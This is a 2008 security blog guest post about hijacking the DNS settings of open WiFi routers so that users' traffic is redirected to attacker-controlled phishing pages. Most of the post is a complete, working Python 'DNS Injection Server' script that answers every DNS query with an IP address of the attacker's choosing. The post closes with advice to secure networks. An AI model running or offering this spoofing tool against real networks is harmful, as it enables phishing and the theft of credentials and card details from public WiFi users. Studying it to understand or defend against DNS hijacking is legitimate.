---
title: WiFi Ownage
author: petko-d-petkov
guest: sam-aldis
date: Thu, 07 Feb 2008 10:59:13 GMT
template: this/views/post.jade
---

> This month GNUCITIZEN's guest blogger is Sam Aldis, the founder of [darkstar.me.uk](http://darkstar.me.uk/). Sam started as a blackhat/script kiddie but soon he has learned a life lesson when he broke into a big football(soccer) leagues site. Sam did not serve any sentence but he had to pay a hefty fine. This is how he turned into a whitehat and now he is in the process of setting up his own security company. These are his words:

I have recently been doing research into WiFi connections without wepkeys and where the attacker is able to change the primary DNS server on the router. This is actually a very serious problem as the attacker is able to get your credit card details or any other information you input without you even knowing.

Imagine you are at a hotel with your laptop. You connect to the WiFi that they provide and type in `www.google.com`, which brings up google's front page. The address bar says http://www.google.com and the page looks genuine so it is.. isn't it? However, attackers may could have got access to the router and changed the primary DNS server through many of the available methods in the wild, like [UPnP hacking](/blog/hacking-with-upnp-universal-plug-and-play), etc.

Theoretically, the attacker could use any IP address to pull the trick, as long as a DNS server was running behind the UDP port 53. But it would be more beneficial if the attacker is under control of this DNS server, so he/she is able to show the user what ever they want them to see. For example, the user could type in their bank's website address and end up at a phishing page but they wouldn't know because they would see their banks address in the title bar and the page could be made to look exactly the same (and auto-update itself through some PHP magic). When the user logs in, a fake DNS server will respond which will make the user go to the wrong IP address. As you can see this is a big threat that will affect anyone who hasn't secured their network.

I have created a python script which can act as a temporary DNS server which will direct all requests to a certain IP (keep checking [http://darkstar.me.uk](http://darkstar.me.uk) for updates). Here is the script that complies to the scenarios described above:

```html
# DNS Injection Server
# Created By fazed
# DNSQuery class adapted from Francisco Santos's
# code. why re-invent the wheel?

from socket import *

class DNSQuery:
 def __init__(self, data):
   self.data=data
   self.domain=''

   tipo = (ord(data[2]) >> 3) & 15
   if tipo == 0:
     ini=12
     lon=ord(data[ini])
     while lon != 0:
       self.domain+=data[ini+1:ini+lon+1]+'.'
       ini+=lon+1
       lon=ord(data[ini])

 def respond(self, ip):
   packet=''
   if self.domain:
     packet+=self.data[:2] + "\x81\x80"
     packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
     packet+=self.data[12:]
     packet+='\xc0\x0c'
     packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
     packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
   return packet

print ":: DNS Injection Server Started ::"
sh = socket(AF_INET, SOCK_DGRAM)
print "Socket Handle Created.."
sh.bind(('',53))
print "Socket Handle Bound To UDP Port 53"
ip = raw_input("IP to inject: ")
try:
   while 1:
       data, addr = sh.recvfrom(1024)
       print "DNS Request From:", addr[0]
       p = DNSQuery(data)
       print "Sending IP address:", ip
       sh.sendto(p.respond(ip),addr)
       print "Response Sent.."
except KeyboardInterrupt:
   print ":: DNS Injection Server Stoped ::"
   sh.close()
```

The bottom line is: secure your networks and don't trust public WiFi access points.
